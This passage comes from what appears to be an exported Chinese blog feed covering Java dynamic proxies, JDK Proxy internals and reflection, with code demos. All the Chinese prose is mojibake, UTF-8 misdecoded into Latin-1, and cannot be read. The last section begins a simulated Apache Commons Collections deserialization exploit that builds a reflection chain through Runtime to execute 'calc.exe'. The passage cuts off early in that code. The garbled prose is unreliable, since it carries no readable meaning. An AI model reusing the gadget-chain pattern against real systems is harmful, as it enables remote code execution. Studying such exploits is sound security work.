DynamicProxy(realSubject); /* * é€šè¿‡Proxyçš„newProxyInstanceæ–¹æ³•æ¥åˆ›å»ºä»£ç†ç±»å¯¹è±¡ï¼Œæ¥çœ‹çœ‹å…¶ä¸‰ä¸ªå‚æ•° * ç¬¬ä¸€ä¸ªå‚æ•° handler.getClass().getClassLoader() ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨handlerè¿™ä¸ªç±»çš„ClassLoaderå¯¹è±¡æ¥åŠ è½½æˆ‘ä»¬çš„ä»£ç†å¯¹è±¡ * ç¬¬äºŒä¸ªå‚æ•°realSubject.getClass().getInterfaces()ï¼Œæˆ‘ä»¬è¿™é‡Œä¸ºä»£ç†å¯¹è±¡æä¾›çš„æŽ¥å£æ˜¯çœŸå®žå¯¹è±¡æ‰€å®žè¡Œçš„æŽ¥å£ï¼Œè¡¨ç¤ºæˆ‘è¦ä»£ç†çš„æ˜¯è¯¥çœŸå®žå¯¹è±¡ï¼Œè¿™æ ·æˆ‘å°±èƒ½è°ƒç”¨è¿™ç»„æŽ¥å£ä¸­çš„æ–¹æ³•äº† * ç¬¬ä¸‰ä¸ªå‚æ•°handlerï¼Œ æˆ‘ä»¬è¿™é‡Œå°†è¿™ä¸ªä»£ç†å¯¹è±¡å…³è”åˆ°äº†ä¸Šæ–¹çš„ InvocationHandler è¿™ä¸ªå¯¹è±¡ä¸Š */ Subject subject = (Subject)Proxy.newProxyInstance(handler.getClass().getClassLoader(), realSubject.getClass().getInterfaces(), handler); System.out.println(subject.getClass().getName()); subject.send(); subject.recv(); &#125;&#125;interface Subject &#123; public void send(); public void recv();&#125;class RealSubject implements Subject &#123; public void send()&#123; System.out.println("[*]Send"); &#125; public void recv()&#123; System.out.println("[*]Recv"); &#125;&#125;class DynamicProxy implements InvocationHandler &#123; //è¦ä»£ç†çš„è¢«ä»£ç†ç±»å¯¹è±¡ private Object subject; //æž„é€ æ–¹æ³•ï¼Œç»™è¢«ä»£ç†ç±»å¯¹è±¡èµ‹åˆå§‹å€¼ DynamicProxy(Object subject)&#123; this.subject = subject; &#125; public Object invoke(Object object, Method method, Object[] args) throws Throwable&#123; //åœ¨ä»£ç†çœŸå®žå¯¹è±¡å‰å¯ä»¥æ·»åŠ ä¸€äº›åŠŸèƒ½æ“ä½œ System.out.println("AOP"); System.out.println("Method: " + method); //å½“ä»£ç†ç±»å¯¹è±¡è°ƒç”¨è¢«ä»£ç†ç±»å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œå…¶ä¼šè‡ªåŠ¨è·³è½¬åˆ°ä»£ç†ç±»å¯¹è±¡å…³è”çš„handlerå¯¹è±¡çš„invoke()æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ method.invoke(subject, args); //åœ¨ä»£ç†çœŸå®žå¯¹è±¡åŽä¹Ÿå¯ä»¥æ·»åŠ ä¸€äº›åŠŸèƒ½æ“ä½œ System.out.println("Write Logs"); return null; &#125;&#125; å†æ¬¡æé†’ï¼ŒJDKæä¾›çš„ä»£ç†åªèƒ½æ˜¯é’ˆå¯¹æŽ¥å£åšä»£ç†ï¼Œä¹Ÿå°±æ˜¯è¯´è°ƒç”¨newProxyInstance()è¿”åˆ›å»ºä»£ç†ç±»å¯¹è±¡æ—¶å›žçš„å¿…é¡»è¦æ˜¯ä¸€ä¸ªæŽ¥å£ã€‚ è§‚å¯Ÿè¾“å‡ºå†…å®¹ï¼š ç¬¬ä¸€è¡Œå†…å®¹ï¼šâ€com.sun.proxy.\$Proxy0â€æ˜¯ç”± System.out.println(subject.getClass().getName()); è¿™æ¡è¯­å¥æ‰“å°å‡ºæ¥çš„ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šä»¥ä¸ºè¿”å›žçš„è¿™ä¸ªä»£ç†å¯¹è±¡ä¼šæ˜¯Subjectç±»åž‹çš„å¯¹è±¡æˆ–è€…æ˜¯InvocationHandlerçš„å¯¹è±¡ï¼Œç„¶å¹¶éžï¼ŒåŽŸå› åœ¨newProxyInstance()æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ä¸Šï¼Œè¯¥å‚æ•°ç»™ä»£ç†ç±»å¯¹è±¡æä¾›äº†ä¸€ç»„æŽ¥å£ï¼Œè€Œè¯¥å¯¹è±¡å°±ä¼šå®žçŽ°è¿™ç»„æŽ¥å£ï¼Œè¿™æ—¶å¯å°†è¿™ä¸ªå¯¹è±¡å¼ºåˆ¶ç±»åž‹è½¬åŒ–ä¸ºè¿™ç»„æŽ¥å£ä¸­çš„ä»»æ„ä¸€ä¸ªï¼Œå› ä¸ºè¿™é‡Œçš„æŽ¥å£æ˜¯Subjectç±»åž‹ï¼Œæ‰€ä»¥å°±å¯ä»¥å°†å…¶è½¬åŒ–ä¸ºSubjectç±»åž‹äº†ã€‚å¦å¤–ï¼Œé€šè¿‡ Proxy.newProxyInstance()åˆ›å»ºçš„ä»£ç†å¯¹è±¡æ˜¯åœ¨JVMè¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶éžæ˜¯InvocationHandlerç±»åž‹ï¼Œä¹Ÿä¸æ˜¯å®šä¹‰çš„é‚£ç»„æŽ¥å£çš„ç±»åž‹ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å‘½åæ–¹å¼éƒ½æ˜¯ä»¥$å¼€å¤´ã€Proxyä¸ºä¸­ã€æœ€åŽä¸ºæ•°å­—ï¼ˆè¡¨ç¤ºå¯¹è±¡çš„æ ‡å·ï¼‰çš„å½¢å¼ã€‚ ç¬¬äºŒè¡Œè‡³ç¬¬äº”è¡Œå†…å®¹ï¼ˆåŽé¢4è¡Œå†…å®¹æ˜¯ç±»ä¼¼çš„ï¼‰ï¼šâ€AOPâ€å’Œâ€Write Logsâ€ä¸ºä»£ç†è¿‡ç¨‹ä¸­æ–°æ·»åŠ çš„è¾“å‡ºåŠŸèƒ½ï¼›ä¸­é—´çš„â€[*]Sendâ€ä¸ºä»£ç†ç±»å¯¹è±¡è°ƒç”¨å…³è”çš„handlerä¸­çš„invoke()æ–¹æ³•æ¥æ‰§è¡ŒçœŸå®žçš„è¢«ä»£ç†ç±»çš„æ–¹æ³•ï¼›â€Methodï¼šâ€è¾“å‡ºçš„æ˜¯handlerä¸­invoke()æ–¹æ³•methodå‚æ•°çš„å€¼ï¼Œè¿™é‡Œå¯çœ‹åˆ°ä¸ºâ€public abstract void Subject.send()â€ï¼Œè¯´æ˜Žè¯¥æ–¹æ³•æ˜¯æ¥è‡ªçœŸå®žçš„è¢«ä»£ç†ç±»å¯¹è±¡çš„æŽ¥å£æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¹¶éžæ˜¯ä»£ç†ç±»å¯¹è±¡ç›´æŽ¥è°ƒç”¨ç›®æ ‡æ–¹æ³•ï¼Œè€Œæ˜¯é€šè¿‡ç”±å…¶å…³è”åˆ°çš„handlerå¯¹è±¡çš„invoke()æ–¹æ³•ä¸­æ¥è°ƒç”¨ï¼Œä»Žè€Œå®žçŽ°ä»£ç†çš„æ–¹å¼è°ƒç”¨ã€‚ åŒæ—¶å› ä¸ºåœ¨ä»£ç ç¼–è¯‘æ—¶å¹¶ä¸çŸ¥é“è¢«ä»£ç†çš„ç±»æ˜¯å“ªä¸ªï¼Œå› æ­¤å®žçŽ°äº†åŠ¨æ€ä»£ç†çš„æ–¹å¼ã€‚ åŽŸç†åˆ†æžæŸ¥çœ‹Proxyç±»çš„newProxyInstance()å‡½æ•°çš„å®žçŽ°ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@CallerSensitive public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) throws IllegalArgumentException &#123; Objects.requireNonNull(h); final Class&lt;?&gt;[] intfs = interfaces.clone(); final SecurityManager sm = System.getSecurityManager(); if (sm != null) &#123; checkProxyAccess(Reflection.getCallerClass(), loader, intfs); &#125; /* * Look up or generate the designated proxy class. */ Class&lt;?&gt; cl = getProxyClass0(loader, intfs); /* * Invoke its constructor with the designated invocation handler. */ try &#123; if (sm != null) &#123; checkNewProxyPermission(Reflection.getCallerClass(), cl); &#125; final Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams); final InvocationHandler ih = h; if (!Modifier.isPublic(cl.getModifiers())) &#123; AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123; public Void run() &#123; cons.setAccessible(true); return null; &#125; &#125;); &#125; return cons.newInstance(new Object[]&#123;h&#125;); &#125; catch (IllegalAccessException|InstantiationException e) &#123; throw new InternalError(e.toString(), e); &#125; catch (InvocationTargetException e) &#123; Throwable t = e.getCause(); if (t instanceof RuntimeException) &#123; throw (RuntimeException) t; &#125; else &#123; throw new InternalError(t.toString(), t); &#125; &#125; catch (NoSuchMethodException e) &#123; throw new InternalError(e.toString(), e); &#125; &#125; å¯ä»¥å‘çŽ°åªæ˜¯å°è£…äº†åˆ›å»ºåŠ¨æ€ä»£ç†ç±»çš„æ­¥éª¤ã€‚ é‡ç‚¹å…³æ³¨â€Class&lt;?&gt; cl = getProxyClass0(loader, intfs);â€ï¼Œå…¶ç”¨äºŽäº§ç”Ÿä»£ç†ç±»ï¼ŒåŽé¢ä»£ç ä¸­çš„æž„é€ å™¨ä¹Ÿæ˜¯é€šè¿‡è¿™é‡Œäº§ç”Ÿçš„ç±»æ¥èŽ·å¾—ï¼Œå› æ­¤å¯çœ‹å‡ºè¿™ä¸ªç±»çš„äº§ç”Ÿå°±æ˜¯æ•´ä¸ªåŠ¨æ€ä»£ç†çš„å…³é”®ã€‚ JDKä¼šç”Ÿæˆä¸€ä¸ªå«$Proxy0çš„ä»£ç†ç±»ï¼Œè¿™ä¸ªç±»æ–‡ä»¶æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œåœ¨åˆ›å»ºä»£ç†ç±»å¯¹è±¡æ—¶ï¼Œé€šè¿‡åå°„æœºåˆ¶èŽ·å¾—è¿™ä¸ªç±»çš„æž„é€ æ–¹æ³•ï¼Œç„¶åŽåˆ›å»ºä»£ç†ç±»å®žä¾‹ã€‚ å°ç»“å¯ä»¥å°†InvocationHandleræŽ¥å£ç±»çœ‹åšä¸€ä¸ªä¸­ä»‹ç±»ï¼Œä¸­ä»‹ç±»æŒæœ‰ä¸€ä¸ªè¢«ä»£ç†å¯¹è±¡å³çœŸå®žå¯¹è±¡ï¼Œåœ¨invoke()æ–¹æ³•ä¸­è°ƒç”¨äº†è¢«ä»£ç†å¯¹è±¡ç›¸åº”çš„æ–¹æ³•ã€‚é€šè¿‡èšåˆæ–¹å¼æŒæœ‰è¢«ä»£ç†å¯¹è±¡çš„å¼•ç”¨ï¼ŒæŠŠå¤–éƒ¨å¯¹invokeçš„è°ƒç”¨æœ€ç»ˆéƒ½è½¬ä¸ºå¯¹è¢«ä»£ç†å¯¹è±¡çš„è°ƒç”¨ã€‚ ä»£ç†ç±»è°ƒç”¨è‡ªå·±æ–¹æ³•æ—¶ï¼Œé€šè¿‡è‡ªèº«æŒæœ‰çš„ä¸­ä»‹ç±»å¯¹è±¡æ¥è°ƒç”¨ä¸­ä»‹ç±»å¯¹è±¡çš„invokeæ–¹æ³•ï¼Œä»Žè€Œè¾¾åˆ°ä»£ç†æ‰§è¡Œè¢«ä»£ç†å¯¹è±¡çš„æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŠ¨æ€ä»£ç†é€šè¿‡ä¸­ä»‹ç±»å®žçŽ°äº†å…·ä½“çš„ä»£ç†åŠŸèƒ½ã€‚ å‚è€ƒjavaåŠ¨æ€ä»£ç†å®žçŽ°ä¸ŽåŽŸç†è¯¦ç»†åˆ†æž javaçš„åŠ¨æ€ä»£ç†æœºåˆ¶è¯¦è§£ JavaåŠ¨æ€ä»£ç†ä¸Žåå°„è¯¦è§£]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaåå°„æœºåˆ¶]]></title>
    <url>%2F2019%2F02%2F01%2FJava%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[åŸºæœ¬æ¦‚å¿µåå°„æœºåˆ¶å®šä¹‰ï¼šJavaåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€æ—¶ï¼Œå¯¹äºŽä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸèŽ·å–åˆ°è¿™ä¸ªç±»çš„æ‰€æœ‰å±žæ€§å’Œæ–¹æ³•ï¼Œå¯¹äºŽä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±žæ€§(åŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•å’Œå±žæ€§)ï¼Œè¿™ç§åŠ¨æ€èŽ·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½å°±ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚ é€šä¿—ç‚¹è®²ï¼Œé€šè¿‡åå°„ï¼Œè¯¥ç±»å¯¹æˆ‘ä»¬æ¥è¯´æ˜¯å®Œå…¨é€æ˜Žçš„ï¼Œæƒ³è¦èŽ·å–ä»»ä½•ä¸œè¥¿éƒ½å¯ä»¥ã€‚ è¦ä½¿ç”¨åå°„æœºåˆ¶ï¼Œå°±å¿…é¡»è¦å…ˆèŽ·å–åˆ°è¯¥ç±»çš„å­—èŠ‚ç æ–‡ä»¶å¯¹è±¡(.class)ï¼Œé€šè¿‡å­—èŠ‚ç æ–‡ä»¶å¯¹è±¡ï¼Œå°±èƒ½å¤Ÿé€šè¿‡è¯¥ç±»ä¸­çš„æ–¹æ³•èŽ·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„æ‰€æœ‰ä¿¡æ¯(æ–¹æ³•ï¼Œå±žæ€§ï¼Œç±»åï¼Œçˆ¶ç±»åï¼Œå®žçŽ°çš„æ‰€æœ‰æŽ¥å£ç­‰ç­‰)ï¼Œæ¯ä¸€ä¸ªç±»å¯¹åº”ç€ä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶ä¹Ÿå°±å¯¹åº”ç€ä¸€ä¸ªClassç±»åž‹çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯å­—èŠ‚ç æ–‡ä»¶å¯¹è±¡ã€‚ åå°„æœºåˆ¶ç›¸å…³ç±»åº“åœ¨Javaä¸­ï¼ŒClassç±»å’Œjava.lang.reflectç±»åº“ä¸€èµ·æž„æˆäº†å¯¹åå°„æœºåˆ¶çš„æ”¯æŒã€‚å…¶ä¸­æœ€å¸¸ä½¿ç”¨åˆ°çš„ç±»æ˜¯Constructorï¼ŒFieldï¼ŒMethodï¼Œè€Œè¿™ä¸‰ä¸ªç±»éƒ½ç»§æ‰¿äº†ä¸€ä¸ªæŽ¥å£java.lang.reflect.Memberã€‚ä¸‹é¢åˆ—ä¸¾ä»‹ç»ä¸€ä¸‹java.lang.reflectç±»åº“ä¸­çš„ç±»ï¼š AccessibleObjectï¼šFieldï¼ŒMethodï¼Œå’ŒConstructorå¯¹è±¡çš„åŸºç±»ã€‚æä¾›äº†å°†åå°„çš„å¯¹è±¡æ ‡è®°ä¸ºåœ¨ä½¿ç”¨æ—¶å–æ¶ˆé»˜è®¤Javaè¯­è¨€è®¿é—®æŽ§åˆ¶æ£€æŸ¥çš„èƒ½åŠ›ã€‚ Arrayï¼šæä¾›äº†åŠ¨æ€åˆ›å»ºå’Œè®¿é—®Javaæ•°ç»„çš„æ–¹æ³•ã€‚ Constructorï¼šæä¾›å…³äºŽç±»çš„å•ä¸ªæž„é€ æ–¹æ³•çš„ä¿¡æ¯ä»¥åŠå¯¹å®ƒçš„è®¿é—®æƒé™ã€‚ Fieldï¼š æä¾›æœ‰å…³ç±»æˆ–æŽ¥å£çš„å•ä¸ªå­—æ®µçš„ä¿¡æ¯ï¼Œä»¥åŠå¯¹å®ƒçš„åŠ¨æ€è®¿é—®æƒé™ã€‚åå°„çš„å­—æ®µå¯èƒ½æ˜¯ä¸€ä¸ªç±»ï¼ˆé™æ€ï¼‰å­—æ®µæˆ–å®žä¾‹å­—æ®µã€‚ Methodï¼š æä¾›å…³äºŽç±»æˆ–æŽ¥å£ä¸Šå•ç‹¬æŸä¸ªæ–¹æ³•ï¼ˆä»¥åŠå¦‚ä½•è®¿é—®è¯¥æ–¹æ³•ï¼‰çš„ä¿¡æ¯ã€‚æ‰€åæ˜ çš„æ–¹æ³•å¯èƒ½æ˜¯ç±»æ–¹æ³•æˆ–å®žä¾‹æ–¹æ³•ï¼ˆåŒ…æ‹¬æŠ½è±¡æ–¹æ³•ï¼‰ã€‚ Modifierï¼š ç±»æä¾›äº† static æ–¹æ³•å’Œå¸¸é‡ï¼Œå¯¹ç±»å’Œæˆå‘˜è®¿é—®ä¿®é¥°ç¬¦è¿›è¡Œè§£ç ã€‚ä¿®é¥°ç¬¦é›†è¢«è¡¨ç¤ºä¸ºæ•´æ•°ï¼Œç”¨ä¸åŒçš„ä½ä½ç½® (bit position) è¡¨ç¤ºä¸åŒçš„ä¿®é¥°ç¬¦ã€‚è¯¥ç±»çš„å­—æ®µå‡æ˜¯intç±»åž‹çš„å˜é‡ã€‚ Proxyï¼š æä¾›ç”¨äºŽåˆ›å»ºåŠ¨æ€ä»£ç†ç±»å’Œå®žä¾‹çš„é™æ€æ–¹æ³•ï¼Œå®ƒè¿˜æ˜¯ç”±è¿™äº›æ–¹æ³•åˆ›å»ºçš„æ‰€æœ‰åŠ¨æ€ä»£ç†ç±»çš„è¶…ç±»ã€‚ ReflectPermissionï¼šåå°„æ“ä½œçš„ Permission ç±»ã€‚ReflectPermission æ˜¯ä¸€ç§æŒ‡å®šæƒé™ï¼Œæ²¡æœ‰åŠ¨ä½œã€‚å½“å‰å®šä¹‰çš„å”¯ä¸€åç§°æ˜¯ suppressAccessChecksï¼Œå®ƒå…è®¸å–æ¶ˆç”±åå°„å¯¹è±¡åœ¨å…¶ä½¿ç”¨ç‚¹ä¸Šæ‰§è¡Œçš„æ ‡å‡† Java è¯­è¨€è®¿é—®æ£€æŸ¥ - å¯¹äºŽ publicã€defaultï¼ˆåŒ…ï¼‰è®¿é—®ã€protectedã€private æˆå‘˜ã€‚ å½“è¦ä½¿ç”¨åå°„æœºåˆ¶åŽ»æŽ¢æŸ¥ä¸€ä¸ªç±»çš„å†…éƒ¨æ—¶ï¼Œè¿˜å¯ä»¥è°ƒç”¨getFields()ï¼ŒgetMethods()å’ŒgetConstructors()ç­‰å¾ˆä¾¿åˆ©çš„æ–¹æ³•ã€‚å¯¹äºŽåå°„æœºåˆ¶ï¼Œå’ŒRTTIï¼ˆRun-Time Type Informationï¼Œè¿è¡Œæ—¶ç±»åž‹ä¿¡æ¯ï¼‰çš„åŒºåˆ«å°±åœ¨äºŽï¼ŒRTTIæ˜¯åœ¨ç¼–è¯‘æ—¶æ‰“å¼€å’Œæ£€æŸ¥.classæ–‡ä»¶ï¼Œè€Œåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡Œæ—¶æ‰“å¼€å’Œæ£€æŸ¥.classæ–‡ä»¶ã€‚ èŽ·å–ç±»åç§°é€šè¿‡åå°„æœºåˆ¶èŽ·å–ç±»åç§°æœ‰ä¸‰ç§æ–¹æ³•ï¼š 1ã€Class clz = Class.forName(â€œcom.test.Userâ€); 2ã€Class clz = com.test.User.class; 3ã€User u = new User(); Class clz = u.getClass(); Demoç¤ºä¾‹ï¼š 123456789101112131415161718192021public class test &#123; public static void main(String[] args) &#123; try &#123; Class clz1 = Class.forName("java.lang.Runtime"); System.out.println("æ–¹æ³•ä¸€ï¼š"); System.out.println(clz1.getName()); &#125; catch (ClassNotFoundException e) &#123; System.out.println("forNameå‡ºé”™"); &#125; Class clz2 = java.lang.ProcessBuilder.class; System.out.println("æ–¹æ³•äºŒï¼š"); System.out.println(clz2.getName()); java.lang.String s = ""; Class clz3 = s.getClass(); System.out.println("æ–¹æ³•ä¸‰ï¼š"); System.out.println(clz3.getName()); &#125;&#125; å¯ä»Žè¿è¡Œç»“æžœä¸­çœ‹åˆ°åˆ†åˆ«èŽ·å–äº†ä¸åŒç±»åç§°ï¼š åˆ›å»ºå¯¹è±¡é€šè¿‡Classåˆ›å»ºå¯¹è±¡ï¼š Class clz = Class.forName(â€œcom.test.Userâ€); User u = (User)clz.newInstane();//è°ƒç”¨æ— å‚æž„é€ å‡½æ•° Demoç¤ºä¾‹ï¼š Uset.classå®šä¹‰Userç±»ï¼ŒåŒ…å«ç”¨æˆ·åå’Œå¹´é¾„ï¼š 12345678910111213141516171819202122232425262728public class User &#123; private String name; private int age; @Override public String toString() &#123; return "User&#123;" + "name='" + name + '\'' + ", age=" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125;&#125; test.classä¸­è°ƒç”¨newInstane()åˆ›å»ºå¯¹è±¡ï¼š 123456789101112131415161718public class test &#123; public static void main(String[] args) &#123; Class clz = User.class; User user = null; try &#123; user = (User)clz.newInstance(); &#125; catch (InstantiationException e)&#123; e.printStackTrace(); &#125; catch (IllegalAccessException e)&#123; e.printStackTrace(); &#125; user.setName("Mi1k7ea"); user.setAge(6); System.out.println(user); &#125;&#125; ä»Žç»“æžœå¯çœ‹åˆ°åˆ›å»ºäº†æ–°çš„Userç±»å¯¹è±¡å¹¶æˆåŠŸèµ‹å€¼ï¼š èŽ·å–ç±»å¯¹è±¡å±žæ€§è¿™é‡Œçš„å±žæ€§æŒ‡çš„æ˜¯ç±»å®šä¹‰çš„ç»„æˆå…ƒç´ ï¼Œå¦‚ä¿®é¥°ç¬¦ã€æ–¹æ³•åã€æˆå‘˜å˜é‡ç­‰ã€‚ èŽ·å–æ‰€æœ‰çš„å±žæ€§ï¼š Class clz = Class.forName(â€œcom.test.Userâ€); Field [] fields = clz.getDeclaredFields(); èŽ·å–ç‰¹å®šå±žæ€§ï¼š Class clz = Class.forName(â€œcom.test.Userâ€); Field [] fields = clz.getDeclaredField(â€œxxxâ€);//xxxä¸ºæŒ‡å®šå±žæ€§å Demoç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526272829import java.lang.reflect.Field;public class test &#123; public static void main(String[] args) &#123; try &#123; Class clz = Class.forName("User"); User user = (User)clz.newInstance(); Field[] fields = clz.getDeclaredFields(); System.out.println("Userç±»æ‰€æœ‰çš„å±žæ€§ï¼š"); for (Field f : fields) &#123; System.out.println(f); &#125; Field field = clz.getDeclaredField("name"); field.setAccessible(true); field.set(user, "Mi1k7ea"); System.out.println("\nä¿®æ”¹çš„Userç±»å¯¹è±¡çš„nameå€¼ä¸ºï¼š"); System.out.println(field.get(user)); System.out.println("ä¿®æ”¹å±žæ€§åŽçš„Userç±»å¯¹è±¡ï¼š"); System.out.println(user); &#125; catch (ClassNotFoundException e) &#123; System.out.println("forNameå‡ºé”™"); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; å¯ä»Žç»“æžœçœ‹åˆ°è°ƒç”¨èŽ·å–äº†getDeclaredFields()æ‰€æœ‰Runtimeç±»çš„å±žæ€§ï¼ŒåŒ…æ‹¬ä¿®é¥°ç¬¦ã€æ–¹æ³•åã€æˆå‘˜å˜é‡ç­‰ï¼ŒåŒæ—¶ä¹Ÿè°ƒç”¨getDeclaredField()èŽ·å–äº†æŒ‡å®šçš„å±žæ€§ï¼š åº”ç”¨ç¤ºä¾‹1ã€åˆ©ç”¨åå°„ï¼Œåœ¨æ³›åž‹ä¸ºintçš„arryaListé›†åˆä¸­å­˜æ”¾ä¸€ä¸ªStringç±»åž‹çš„å¯¹è±¡åŽŸç†ï¼šé›†åˆä¸­çš„æ³›åž‹åªåœ¨ç¼–è¯‘å™¨æœ‰æ•ˆï¼Œè€Œåˆ°äº†è¿è¡ŒæœŸæ—¶æ³›åž‹åˆ™ä¼šå¤±æ•ˆã€‚ 1234567891011121314151617import java.lang.reflect.Method;import java.util.ArrayList;import java.util.List;public class test &#123; public static void main(String[] args) throws Exception&#123; List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); list.add(1); list.add(2);// list.add("Mi1k7ea");//åœ¨ç¼–è¯‘å™¨ä¸­æ³›åž‹ç”Ÿæ•ˆï¼Œæ’å…¥å­—ç¬¦ä¸²å¯¹è±¡ä¼šæŠ¥é”™ Class clz = list.getClass(); Method method = clz.getMethod("add", Object.class); method.invoke(list, "Mi1k7ea"); System.out.println(list); &#125;&#125; å¯ä»¥çœ‹åˆ°æˆåŠŸå°†Stringç±»åž‹å¯¹è±¡æ”¾å…¥æ³›åž‹ä¸ºintåž‹çš„æ•°ç»„ä¸­ï¼š 2ã€åˆ©ç”¨åå°„ï¼Œç®€åŒ–ç¼–å†™Servletçš„ä¸ªæ•°åˆ©ç”¨åå°„æœºåˆ¶ï¼Œåœ¨ä¸ºç¨‹åºæ·»åŠ æ–°åŠŸèƒ½æ—¶å¯ä»¥æ— éœ€é€ä¸ªå¯¹åº”ç¼–å†™æ–°çš„Servletï¼Œæé«˜å¼€å‘æ•ˆçŽ‡å’Œä»£ç ç®€æ´æ€§ã€‚ä¸»è¦æœ‰å¦‚ä¸‹ä¸¤ä¸ªæ–¹å¼ä¼˜åŒ–ã€‚ ï¼ˆ1ï¼‰ã€é€šè¿‡ç¼–å†™åˆ©ç”¨åå°„æœºåˆ¶èŽ·å–æŒ‡å®šå±žæ€§å€¼çš„Servletçš„æ–¹å¼ æ¯æ¬¡ä»Žé¡µé¢ä¼ è¿‡æ¥ä¸€ä¸ªå‚æ•°ï¼Œmethod=â€xxxâ€; ç„¶åŽç¼–å†™ä¸€ä¸ªServletï¼ŒèŽ·å¾—å…¶å‚æ•°methodçš„å€¼ï¼Œè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æžœæ˜¯addï¼Œåˆ™è°ƒç”¨addæ–¹æ³•ï¼Œå¦‚æžœæ˜¯deleteï¼Œåˆ™è°ƒç”¨deleteæ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥å†™åœ¨ä¸€ä¸ªservletä¸­å®žçŽ°æ‰€æœ‰çš„åŠŸèƒ½äº†ã€‚ ï¼ˆ2ï¼‰ã€é€šè¿‡Servletçš„ç”Ÿå‘½å‘¨æœŸå³service()å®žçŽ°åå°„æœºåˆ¶æ¥å®žçŽ° ç¼–å†™ä¸€ä¸ªé€šç”¨çš„BaseServletï¼Œç»§æ‰¿äºŽHttpServletï¼š ç¼–å†™å…·ä½“å®žçŽ°çš„æ–¹æ³•Servletç±»MyServlet001ï¼Œç»§æ‰¿äºŽBaseServletï¼š ç”±Servletçš„ç”Ÿå‘½å‘¨æœŸå¯çŸ¥ï¼Œåœ¨è®¿é—®è¯¥Servletæ—¶ä¼šè°ƒç”¨service()æ–¹æ³•ï¼Œç„¶è€ŒMyServlet001ç±»ä¸­å¹¶æ— service()ï¼Œå› æ­¤ä¼šè¿”å›žåˆ°çˆ¶ç±»BaseServletä¸­æ‰¾åˆ°è¯¥service()æ–¹æ³•ï¼Œå†èŽ·å–å‚æ•°ä»Žè€ŒçŸ¥é“éœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œå› ä¸ºæ–¹æ³•çš„ç¼–å†™éƒ½åœ¨å­ç±»ä¸­ï¼Œæ‰€ä»¥é€šè¿‡åå°„ï¼ŒèŽ·å–åˆ°å­ç±»ä¸­å¯¹åº”çš„æ–¹æ³•å¹¶è¿è¡Œï¼Œå…¶ä¸­éœ€è¦æ³¨æ„çš„æ˜¯thisè¿™ä¸ªå‚æ•°åœ¨BaseServletä¸­çš„ç”¨æ³•ã€‚ 3ã€åˆ©ç”¨åå°„ï¼Œæž„é€ é“¾å¼ç»“æž„çš„ååºåˆ—åŒ–æ¼æ´žåˆ©ç”¨payloadåœ¨ç»å…¸çš„Apache Commons Collectionsååºåˆ—åŒ–æ¼æ´žä¸­ï¼Œå…¶payloadçš„æž„é€ æ­£æ˜¯åˆ©ç”¨äº†åå°„æœºåˆ¶æ¥å®žçŽ°é“¾å¼ç»“æž„ï¼Œå°†è¦æ‰§è¡Œçš„æ¶æ„ä»£ç æž„é€ æˆä¸€æ¡åå°„é“¾ï¼Œå†é€šè¿‡åŒ…å«è‡ªå®šä¹‰readObject()æ–¹æ³•çš„ç±»æ¥è§¦å‘æ‰§è¡Œã€‚ è¿™é‡Œç®€å•æ¨¡æ‹Ÿä¸€ä¸‹è¯¥ååºåˆ—åŒ–æ¼æ´žåœºæ™¯ï¼Œä»£ç ç¤ºä¾‹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import java.io.*;public class ReflectionPlay implements Serializable &#123; public static void main(String[] args) throws Exception &#123; ReflectionPlay rp = new ReflectionPlay(); rp.deserialize(rp.serialize(rp.getObject())); &#125; //æž„é€ é“¾å¼ç»“æž„çš„ReflectionChainsç±»å¯¹è±¡å¹¶å¤åˆ¶åˆ°ReadObjectç±»å¯¹è±¡ä¸­ï¼Œè¿”å›žè¯¥æ¶æ„å¯¹è±¡ public Object getObject() &#123; String command = "calc.exe"; Object firstObject = Runtime.class; 